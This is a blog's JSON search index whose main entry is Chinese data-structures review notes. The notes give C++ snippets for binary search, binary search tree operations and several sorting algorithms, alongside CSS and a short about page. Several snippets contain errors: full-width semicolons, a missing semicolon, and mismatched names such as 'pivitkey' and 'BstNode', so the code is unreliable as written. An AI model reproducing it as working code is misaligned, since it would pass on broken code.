class=\"keyword\">else</span>  <span class=\"keyword\">if</span> (k &gt; r[mid]) </span><br><span class=\"line\">                   <span class=\"keyword\">return</span> BinSearch2(r, mid+<span class=\"number\">1</span>, high, k); </span><br><span class=\"line\">               <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"二叉搜索树\"><a href=\"#二叉搜索树\" class=\"headerlink\" title=\"二叉搜索树\"></a>二叉搜索树</h2><p>定义：二叉搜索树是具有以下性质的二叉树</p>\n<ol>\n<li>所有结点的关键码互不相同。</li>\n<li>左子树（如果非空）上所有结点的关键码都小于根结点的关键码。</li>\n<li>右子树（如果非空）上所有结点的关键码都大于根结点的关键码。</li>\n<li>左子树和右子树也是二叉搜索树。</li>\n</ol>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//搜索算法</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">E</span>, <span class=\"title\">class</span> <span class=\"title\">K</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">BSTNode</span>&lt;E, K&gt;* <span class=\"title\">BST</span>&lt;E, K&gt;:</span>: Search (<span class=\"keyword\">const</span> K x, BSTNode&lt;E, K&gt; *ptr) </span><br><span class=\"line\">&#123;     </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;      </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x &lt; ptr-&gt;data) <span class=\"keyword\">return</span> Search(x, ptr-&gt;left);     </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x &gt; ptr-&gt;data) <span class=\"keyword\">return</span> Search(x, ptr-&gt;right);     </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> ptr;    <span class=\"comment\">//搜索成功 </span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二叉搜索树的插入\"><a href=\"#二叉搜索树的插入\" class=\"headerlink\" title=\"二叉搜索树的插入\"></a>二叉搜索树的插入</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//插入</span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">E</span>, <span class=\"title\">class</span> <span class=\"title\">K</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">bool</span> <span class=\"title\">BST</span>&lt;E, K&gt;:</span>:Insert (<span class=\"keyword\">const</span> E&amp; e1,   BSTNode&lt;E, K&gt; *&amp; ptr)</span><br><span class=\"line\"> &#123;\t  <span class=\"comment\">//注意参数形式 </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>) &#123;\t   <span class=\"comment\">//新结点作为叶结点插入</span></span><br><span class=\"line\">        ptr = <span class=\"keyword\">new</span> BstNode&lt;E, K&gt;(e1);\t  <span class=\"comment\">//创建新结点</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>)&#123; <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"Out of space\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>); &#125;</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (e1 &lt; ptr-&gt;data) <span class=\"keyword\">return</span> Insert (e1, ptr-&gt;left);\t \t\t\t </span><br><span class=\"line\">  \t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (e1 &gt; ptr-&gt;data) <span class=\"keyword\">return</span> Insert (e1, ptr-&gt;right);\t\t\t </span><br><span class=\"line\">  \t<span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;  <span class=\"comment\">//x已在树中,不再插入</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223024868.png\" alt=\"image-20200703223024868\"></p>\n<h3 id=\"二叉搜索树的删除\"><a href=\"#二叉搜索树的删除\" class=\"headerlink\" title=\"二叉搜索树的删除\"></a>二叉搜索树的删除</h3><p>有三种情况：</p>\n<ol>\n<li>被删的结点是叶子</li>\n<li>被删结点只有左子树或只有右子树</li>\n<li>被删结点既有左子树又有右子树</li>\n</ol>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223603100.png\" alt=\"image-20200703223603100\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223624325.png\" alt=\"image-20200703223624325\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223643364.png\" alt=\"image-20200703223643364\"></p>\n<h1 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h1><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703030054652.png\" alt=\"image-20200703030054652\"></p>\n<h2 id=\"直接插入排序\"><a href=\"#直接插入排序\" class=\"headerlink\" title=\"直接插入排序\"></a>直接插入排序</h2><p><strong>基本思想：在插入第 i（i＞1）个记录时，前面的 i-1个记录已经排好序。</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703200120034.png\" alt=\"image-20200703200120034\"></p>\n<p><strong>平均情况下排序的时间复杂度为 o(n2)。<br>直接插入排序是一种稳定的排序方法。</strong></p>\n<h2 id=\"希尔排序\"><a href=\"#希尔排序\" class=\"headerlink\" title=\"希尔排序\"></a>希尔排序</h2><p><strong>基本思想：将整个待排序记录分割成若干个子序列，在子序列内分别进行直接插入排序，待整个序列中的记录基本有序时，对全体记录进行直接插入排序。</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201115198.png\" alt=\"image-20200703201115198\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201212433.png\" alt=\"image-20200703201212433\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201232582.png\" alt=\"image-20200703201232582\"></p>\n<p>gap通常取：</p>\n<p>$gap=\\lfloor gap/3\\rfloor+1$</p>\n<p><strong>希尔排序是一种不稳定的排序算法。</strong></p>\n<p>eg：</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201916100.png\" alt=\"image-20200703201916100\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//希尔排序的算法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Shellsort</span> <span class=\"params\">(dataList&lt;T&gt;&amp; L, <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> left, <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> right)</span></span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123; <span class=\"keyword\">int</span> i, j, gap = right-left+<span class=\"number\">1</span>; <span class=\"comment\">//增量的初始值为待排序个数</span></span><br><span class=\"line\">\tElement&lt;T&gt; temp;</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;  \tgap = gap/<span class=\"number\">3</span>+<span class=\"number\">1</span>;\t\t\t<span class=\"comment\">//求下一增量值</span></span><br><span class=\"line\">        \t\t<span class=\"keyword\">for</span>(i=left+gap;i&lt;=right;i++)</span><br><span class=\"line\">           \t \t<span class=\"keyword\">if</span> (L[i]&lt;L[i-gap]) &#123;<span class=\"comment\">//逆序</span></span><br><span class=\"line\">                \t\t\ttemp=L[i];</span><br><span class=\"line\">                \t\t\tj = i-gap;</span><br><span class=\"line\">                \t\t\t<span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">                   \t\t\tL[j+gap] = L[j];</span><br><span class=\"line\">                        j= j-gap;</span><br><span class=\"line\">                \t\t\t&#125; <span class=\"keyword\">while</span> (j&gt;=left &amp;&amp; temp&lt;L[j]);</span><br><span class=\"line\">               \t\t\tL[j+gap]=temp;\t<span class=\"comment\">//将vector[i]回送</span></span><br><span class=\"line\">           \t\t&#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (gap &gt; <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h2><p><strong>基本思想：两两比较相邻记录的关键码，如果反序则交换，直到没有反序的记录为止。</strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BubbleSort</span> <span class=\"params\">(T V[], <span class=\"keyword\">int</span> n )</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">bool</span> exchange ;   <span class=\"keyword\">int</span> i , j ;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">1</span>;i&lt;n;i++)&#123;</span><br><span class=\"line\">\texchange = <span class=\"literal\">false</span>;\t\t <span class=\"comment\">//标志为0假定未交换</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (j=n<span class=\"number\">-1</span>;j&gt;= i；j--)     </span><br><span class=\"line\"> \t\t<span class=\"keyword\">if</span> (V[j<span class=\"number\">-1</span>]&gt;V[j]) &#123; \t<span class=\"comment\">//逆序</span></span><br><span class=\"line\">                T temp=V[j<span class=\"number\">-1</span>];  V[j<span class=\"number\">-1</span>]=V[j]; V[j]=temp<span class=\"comment\">//交换</span></span><br><span class=\"line\">\t            exchange = <span class=\"literal\">true</span>;      <span class=\"comment\">//标志置为1,有交换</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(exchange==<span class=\"literal\">false</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h2><p><strong>基本思想：取待排序序列中一个元素作为基准，按照该元素的排序码的大小，将整个元素分为左右两个子序列，左侧都小于该排序码，右侧都大于。然后，重复实行这个方法，直到序列有序。</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703204842947.png\" alt=\"image-20200703204842947\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//快速排序的算法</span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">QuickSort</span> (<span class=\"title\">dataList</span>&lt;T&gt;&amp; <span class=\"title\">L</span>,  <span class=\"title\">int</span> <span class=\"title\">left</span>,  <span class=\"title\">int</span> <span class=\"title\">right</span>) </span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">//对Vector[left..right]进行排</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (left &lt; right) &#123;\t\t<span class=\"comment\">//元素序列长度大于1时</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> pivotpos = L.Partition (left, right);    <span class=\"comment\">//划分</span></span><br><span class=\"line\">        QuickSort (L, left, pivotpos<span class=\"number\">-1</span>);</span><br><span class=\"line\">        QuickSort (L, pivotpos+<span class=\"number\">1</span>, right);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;；</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Partition</span><span class=\"params\">( SqList &amp;L,  <span class=\"keyword\">int</span> low,  <span class=\"keyword\">int</span> high)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">    L.r[<span class=\"number\">0</span>] = L.r[low];</span><br><span class=\"line\">    pivitkey = L.r[low].key;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( low &lt; high)&#123;</span><br><span class=\"line\">         <span class=\"keyword\">while</span>( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey)  --high;</span><br><span class=\"line\">         L.r[low] = L.r[high];</span><br><span class=\"line\">         <span class=\"keyword\">while</span>( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey)  ++low;</span><br><span class=\"line\">         L.r[high] = L.r[low];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    L.r[low] = L.r[<span class=\"number\">0</span>];   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> low;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>快速排序是一种不稳定的排序算法</strong></p>\n<h2 id=\"堆排序\"><a href=\"#堆排序\" class=\"headerlink\" title=\"堆排序\"></a>堆排序</h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223906279.png\" alt=\"image-20200703223906279\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223916193.png\" alt=\"image-20200703223916193\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223926277.png\" alt=\"image-20200703223926277\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223943434.png\" alt=\"image-20200703223943434\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223950979.png\" alt=\"image-20200703223950979\"></p>\n","categories":["数据结构与算法"],"tags":["Course"]},{"title":"我的第一篇博客","url":"https://pz1o.top/2020/06/27/我的第一篇博客/","content":"<p>2020/6/27 我的第一篇博客</p>\n","categories":[],"tags":[]},{"title":"","url":"https://pz1o.top/personal-style.css","content":"@font-face {\n    font-family: \"Meiryo\";\n    src: url(\"/fonts/Meiryo.eot\");\n    /* IE9 */\n    src: url(\"/fonts/Meiryo.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n    url(\"/fonts/Meiryo.woff\") format(\"woff\"), /* chrome, firefox */\n    url(\"/fonts/Meiryo.ttf\") format(\"truetype\"), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */\n    url(\"/fonts/Meiryo.svg#Meiryo\") format(\"svg\");\n    /* iOS 4.1- */\n    font-style: normal;\n    font-weight: normal;\n  }\n  html.page-home {\n    position: absolute;\n    top: 0;\n    left: 0;\n    right: 0;\n    bottom: 0;\n    background-image: url('/images/bg.jpg');\n    background-color: transparent;\n    background-size: cover;\n    background-position: center center;\n    background-repeat: no-repeat;\n  \n    /*background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);*/\n    /*background-blend-mode: screen;*/\n  \n    /*background: linear-gradient(to left, #5f2c82, #49a09d);*/\n  }","categories":[],"tags":[]},{"title":"category","url":"https://pz1o.top/category/index.html","content":"","categories":[],"tags":[]},{"title":"about","url":"https://pz1o.top/about/index.html","content":"<p>CUMT大二在读💻</p>\n<p>业余混子😴…</p>\n<p>正在学习PWN🐱‍👤</p>\n<p>ddl选手🐱‍🏍</p>\n","categories":[],"tags":[]},{"title":"","url":"https://pz1o.top/css/personal-style.css","content":"@font-face {\n    font-family: \"Meiryo\";\n    src: url(\"/fonts/Meiryo.eot\");\n    /* IE9 */\n    src: url(\"/fonts/Meiryo.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n    url(\"/fonts/Meiryo.woff\") format(\"woff\"), /* chrome, firefox */\n    url(\"/fonts/Meiryo.ttf\") format(\"truetype\"), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */\n    url(\"/fonts/Meiryo.svg#Meiryo\") format(\"svg\");\n    /* iOS 4.1- */\n    font-style: normal;\n    font-weight: normal;\n  }\n  html.page-home {\n    position: absolute;\n    top: 0;\n    left: 0;\n    right: 0;\n    bottom: 0;\n    background-image: url('/images/bg.jpg');\n    background-color: transparent;\n    background-size: cover;\n    background-position: center center;\n    background-repeat: no-repeat;\n  \n    /*background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);*/\n    /*background-blend-mode: screen;*/\n  \n    /*background: linear-gradient(to left, #5f2c82, #49a09d);*/\n\n  }\n}","categories":[],"tags":[]},{"title":"search","url":"https://pz1o.top/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"https://pz1o.top/tag/index.html","content":"","categories":[],"tags":[]}]